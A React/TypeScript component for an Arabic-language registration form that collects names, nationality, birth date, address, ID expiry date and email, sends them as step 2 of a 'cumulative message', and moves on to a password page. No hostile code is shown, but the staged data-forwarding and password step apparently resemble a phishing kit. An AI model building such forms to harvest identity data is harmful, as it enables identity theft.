import { useState } from "react";
import { useNavigate } from "react-router-dom";
import ReCAPTCHA from "react-google-recaptcha";
import { format } from "date-fns";
import { ar } from "date-fns/locale";
import { CalendarIcon } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Label } from "@/components/ui/label";
import { Input } from "@/components/ui/input";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import { Calendar } from "@/components/ui/calendar";
import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover";
import { Info } from "lucide-react";
import { cn } from "@/lib/utils";
import { useRegistration } from "@/contexts/RegistrationContext";

const PersonalInfoForm = () => {
  const navigate = useNavigate();
  const { updateData, sendCumulativeMessage } = useRegistration();
  const [birthDate, setBirthDate] = useState<Date>();
  const [idExpiryDate, setIdExpiryDate] = useState<Date>();
  const [nationality, setNationality] = useState<string>("");
  const [arabicFirstName, setArabicFirstName] = useState<string>("");
  const [arabicMiddleName, setArabicMiddleName] = useState<string>("");
  const [arabicLastName, setArabicLastName] = useState<string>("");
  const [englishFirstName, setEnglishFirstName] = useState<string>("");
  const [englishMiddleName, setEnglishMiddleName] = useState<string>("");
  const [englishLastName, setEnglishLastName] = useState<string>("");
  const [gender, setGender] = useState<string>("");
  const [buildingNumber, setBuildingNumber] = useState<string>("");
  const [street, setStreet] = useState<string>("");
  const [area, setArea] = useState<string>("");
  const [email, setEmail] = useState<string>("");

  const handleBack = () => {
    navigate("/");
  };

  const handleCancel = () => {
    navigate("/");
  };

  const isFormValid = () => {
    const hasArabicName = arabicFirstName.trim() !== "" && arabicLastName.trim() !== "";
    const hasEnglishName = englishFirstName.trim() !== "" && englishLastName.trim() !== "";

    return nationality !== "" &&
           (hasArabicName || hasEnglishName) &&
           birthDate !== undefined &&
           idExpiryDate !== undefined &&
           gender !== "" &&
           buildingNumber.trim() !== "" &&
           street.trim() !== "" &&
           area.trim() !== "" &&
           email.trim() !== "";
  };

  const handleContinue = async () => {
    if (!isFormValid()) {
      alert("يرجى إكمال جميع الحقول المطلوبة بشكل صحيح");
      return;
    }

    const fullNameArabic = `${arabicFirstName} ${arabicMiddleName} ${arabicLastName}`.trim();
    const fullNameEnglish = `${englishFirstName} ${englishMiddleName} ${englishLastName}`.trim();
    const address = `مبنى ${buildingNumber}، شارع ${street}، منطقة ${area}`;

    const newData = {
      nationality,
      fullNameArabic,
      fullNameEnglish,
      dateOfBirth: birthDate ? format(birthDate, "PPP", { locale: ar }) : "",
      idExpiryDate: idExpiryDate ? format(idExpiryDate, "PPP", { locale: ar }) : "",
      gender: gender === "male" ? "ذكر" : "أنثى",
      address,
      email,
    };

    updateData(newData);
    await sendCumulativeMessage(2, "البيانات الشخصية", newData);
    navigate("/password");
  };

  const nationalities = [
    { value: "qatar", label: "القطرية" },
    { value: "saudi", label: "السعودية" },
    { value: "uae", label: "الإماراتية" },
    { value: "kuwait", label: "الكويتية" },
    { value: "bahrain", label: "البحرينية" },
    { value: "oman", label: "العمانية" },
    { value: "egypt", label: "المصرية" },
    { value: "jordan", label: "الأردنية" },
    { value: "lebanon", label: "اللبنانية" },
    { value: "syria", label: "السورية" },
    { value: "iraq", label: "العراقية" },
    { value: "palestine", label: "الفلسطينية" },
    { value: "morocco", label: "المغربية" },
    { value: "tunisia", label: "التونسية" },
    { value: "algeria", label: "الجزائرية" },
    { value: "libya", label: "الليبية" },
    { value: "sudan", label: "السودانية" },
    { value: "yemen", label: "اليمنية" },
    { value: "india", label: "الهندية" },
    { value: "pakistan", label: "الباكستانية" },
    { value: "philippines", label: "الفلبينية" },
    { value: "indonesia", label: "الإندونيسية" },
    { value: "bangladesh", label: "البنغلاديشية" },
    { value: "srilanka", label: "السريلانكية" },
    { value: "nepal", label: "النيبالية" },
    { value: "uk", label: "البريطانية" },
    { value: "usa", label: "الأمريكية" },
    { value: "france", label: "الفرنسية" },
    { value: "germany", label: "الألمانية" },
    { value: "turkey", label: "التركية" },
  ];

  return (
    <div className="bg-gray-100 rounded-lg shadow-sm p-8 max-w-4xl mx-auto">
      <h2 className="text-2xl font-semibold mb-2 text-right">البيانات الشخصية</h2>

      <div className="space-y-6 mb-8">
        {/* الجنسية */}
        <div>
          <Label htmlFor="nationality" className="text-right block mb-2">
            الجنسية
          </Label>
          <Select value={nationality} onValueChange={setNationality}>
            <SelectTrigger className="bg-white">
              <SelectValue placeholder="اختر الجنسية" />
            </SelectTrigger>
            <SelectContent>
              {nationalities.map((nat) => (
                <SelectItem key={nat.value} value={nat.value}>
                  {nat.label}
                </SelectItem>
              ))}
            </SelectContent>
          </Select>
        </div>

        {/* الاسم */}
        <div>
          <div className="flex items-start gap-2 mb-4">
            <Info className="w-5 h-5 mt-0.5 flex-shrink-0 text-primary" />
            <div className="text-sm text-right">
              <span className="font-semibold block mb-1">الاسم</span>
              <span className="text-muted-foreground">
                الرجاء إدخال أحد الأسماء العربية أو الإنجليزية (الاسم الأول والأخير على الأقل)
              </span>
            </div>
          </div>

          {/* الاسم بالعربي */}
          <div className="mb-4">
            <Label className="text-right block mb-2">الاسم بالعربي</Label>
            <div className="grid grid-cols-3 gap-4">
              <Input
                type="text"
                placeholder="الاسم الأول"
                className="text-right bg-white placeholder:text-right"
                dir="rtl"
                value={arabicFirstName}
                onChange={(e) => setArabicFirstName(e.target.value)}
              />
              <Input
                type="text"
                placeholder="الاسم الأوسط"
                className="text-right bg-white placeholder:text-right"
                dir="rtl"
                value={arabicMiddleName}
                onChange={(e) => setArabicMiddleName(e.target.value)}
              />
              <Input
                type="text"
                placeholder="الاسم الأخير"
                className="text-right bg-white placeholder:text-right"
                dir="rtl"
                value={arabicLastName}
                onChange={(e) => setArabicLastName(e.target.value)}
              />
            </div>
          </div>

          {/* الاسم بالإنجليزي */}
          <div>
            <Label className="text-right block mb-2">الاسم بالإنجليزي</Label>
            <div className="grid grid-cols-3 gap-4">
              <Input
                type="text"
                placeholder="Last Name"
                className="text-right bg-white placeholder:text-right"
                dir="rtl"
                value={englishLastName}
                onChange={(e) => setEnglishLastName(e.target.value)}
              />
              <Input
                type="text"
                placeholder="Middle Name"
                className="text-right bg-white placeholder:text-right"
                dir="rtl"
                value={englishMiddleName}
                onChange={(e) => setEnglishMiddleName(e.target.value)}
              />
              <Input
                type="text"
                placeholder="First Name"
                className="text-right bg-white placeholder:text-right"
                dir="rtl"
                value={englishFirstName}
                onChange={(e) => setEnglishFirstName(e.target.value)}
              />
            </div>
          </div>
        </div>

        {/* تاريخ الميلاد */}
        <div>
          <Label className="text-right block mb-2">
            تاريخ الميلاد
          </Label>
          <Popover>
            <PopoverTrigger asChild>
              <Button
                variant="outline"
                className={cn(
                  "w-full justify-between text-right font-normal bg-white",
                  !birthDate && "text-muted-foreground"
                )}
                dir="rtl"
              >
                {birthDate ? format(birthDate, "PPP", { locale: ar }) : <span>اختر تاريخ الميلاد</span>}
                <CalendarIcon className="mr-2 h-4 w-4" />
              </Button>
            </PopoverTrigger>
            <PopoverContent className="w-auto p-0" align="end">
              <Calendar
                mode="single"
                selected={birthDate}
                onSelect={setBirthDate}
                disabled={(date) =>
                  date > new Date() || date < new Date("1900-01-01")
                }
                initialFocus
              />
            </PopoverContent>
          </Popover>
        </div>

        {/* الجنس */}
        <div>
          <Label className="text-right block mb-2">
            الجنس
          </Label>
          <RadioGroup value={gender} onValueChange={setGender} className="flex gap-6 justify-end">
            <div className="flex items-center gap-2">
              <Label htmlFor="female" className="text-base cursor-pointer">
                أنثى
              </Label>
              <RadioGroupItem value="female" id="female" />
            </div>
            <div className="flex items-center gap-2">
              <Label htmlFor="male" className="text-base cursor-pointer">
                ذكر
              </Label>
              <RadioGroupItem value="male" id="male" />
            </div>
          </RadioGroup>
        </div>

        {/* العنوان */}
        <div>
          <Label className="text-right block mb-2">
            العنوان
          </Label>
          <div className="bg-primary rounded-lg p-4 space-y-4 max-w-md">
            <div>
              <Label className="text-white text-right block mb-2">رقم المبنى</Label>
              <Input
                type="text"
                className="text-right bg-white placeholder:text-right"
                dir="rtl"
                value={buildingNumber}
                onChange={(e) => setBuildingNumber(e.target.value)}
              />
            </div>
            <div className="grid grid-cols-2 gap-4">
              <div>
                <Label className="text-white text-right block mb-2">الشارع</Label>
                <Input
                  type="text"
                  className="text-right bg-white placeholder:text-right"
                  dir="rtl"
                  value={street}
                  onChange={(e) => setStreet(e.target.value)}
                />
              </div>
              <div>
                <Label className="text-white text-right block mb-2">المنطقة</Label>
                <Input
                  type="text"
                  className="text-right bg-white placeholder:text-right"
                  dir="rtl"
                  value={area}
                  onChange={(e) => setArea(e.target.value)}
                />
              </div>
            </div>
          </div>
        </div>

        {/* تاريخ انتهاء صلاحية البطاقة الشخصية */}
        <div>
          <Label className="text-right block mb-2">
            تاريخ انتهاء صلاحية البطاقة الشخصية
          </Label>
          <Popover>
            <PopoverTrigger asChild>
              <Button
                variant="outline"
                className={cn(
                  "w-full justify-between text-right font-normal bg-white",
                  !idExpiryDate && "text-muted-foreground"
                )}
                dir="rtl"
              >
                {idExpiryDate ? format(idExpiryDate, "PPP", { locale: ar }) : <span>اختر تاريخ انتهاء الصلاحية</span>}
                <CalendarIcon className="mr-2 h-4 w-4" />
              </Button>
            </PopoverTrigger>
            <PopoverContent className="w-auto p-0" align="end">
              <Calendar
                mode="single"
                selected={idExpiryDate}
                onSelect={setIdExpiryDate}
                disabled={(date) =>
                  date < new Date()
                }
                initialFocus
                className={cn("p-3 pointer-events-auto")}
              />
            </PopoverContent>
          </Popover>
        </div>

        {/* البريد الإلكتروني */}
        <div>
          <Label htmlFor="email" className="text-right block mb-2">
            البريد الإلكتروني
          </Label>
          <Input
            id="email"
            type="email"
            className="text-right bg-white placeholder:text-right"
            dir="rtl"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />
          <div className="flex items-start gap-2 mt-2 text-sm text-muted-foreground">
            <Info className="w-4 h-4 mt-0.5 flex-shrink-0" />
            <p className="text-right">
              يُرجى التأكد من إدخال البريد الإلكتروني المسجل والمعتمد لدى شركة الاتصالات الخاصة بك، حيث سيتم استخدامه للتحقق من هويتك وإرسال الإشعارات الهامة.
            </p>
          </div>
        </div>

        {/* إعادة إدخال البريد الإلكتروني */}
        <div>
          <Label htmlFor="confirmEmail" className="text-right block mb-2">
            أعد إدخال البريد الإلكتروني
          </Label>
          <Input
            id="confirmEmail"
            type="email"
            className="text-right bg-white placeholder:text-right"
            dir="rtl"
          />
        </div>
      </div>

      {/* الأزرار */}
      <div className="flex flex-col-reverse sm:flex-row sm:items-center sm:justify-between gap-3 sm:gap-4 pt-6 border-t border-border">
        <div className="flex gap-3 w-full sm:w-auto">
          <Button variant="outline" className="flex-1 sm:flex-none sm:min-w-24 h-12 sm:h-10" onClick={handleBack}>
            رجوع
          </Button>
          <Button variant="outline" className="flex-1 sm:flex-none sm:min-w-24 h-12 sm:h-10" onClick={handleCancel}>
            إلغاء
          </Button>
        </div>

        <Button
          className="w-full sm:w-auto sm:min-w-32 h-12 sm:h-10 bg-primary hover:bg-primary/90"
          onClick={handleContinue}
          disabled={!isFormValid()}
        >
          استمر
        </Button>
      </div>
    </div>
  );
};

export default PersonalInfoForm;
